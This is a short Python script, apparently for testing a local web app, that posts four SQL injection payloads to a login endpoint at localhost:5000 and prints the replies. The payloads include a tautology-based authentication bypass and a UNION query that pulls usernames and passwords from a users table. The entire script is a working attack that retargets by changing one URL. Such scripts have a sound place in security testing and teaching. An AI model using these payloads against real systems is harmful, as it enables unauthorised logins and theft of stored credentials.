import requests

TARGET_URL = "http://localhost:5000/login"

payloads = [
    {
        "desc": "classic authentication bypass",
        "data": {"username": "admin' OR '1'='1", "password": "irrelevant"}
    },
    {
        "desc": "UNION-based injection to enumerate users",
        "data": {"username": "admin' UNION SELECT username, password FROM users--", "password": "irrelevant"}
    },
    {
        "desc": "tautology-based injection",
        "data": {"username": "' OR '1'='1", "password": ""}
    },
    {
        "desc": "comment sequence injection",
        "data": {"username": "admin' -- ", "password": ""}
    }
]

for payload in payloads:
    print(f"[*] Attempting {payload['desc']}...")
    response = requests.post(TARGET_URL, data=payload["data"])
    print(response.text)
    print("\n" + "-"*60 + "\n")

print("[*] Done. Review the responses above for signs of SQL injection vulnerability.")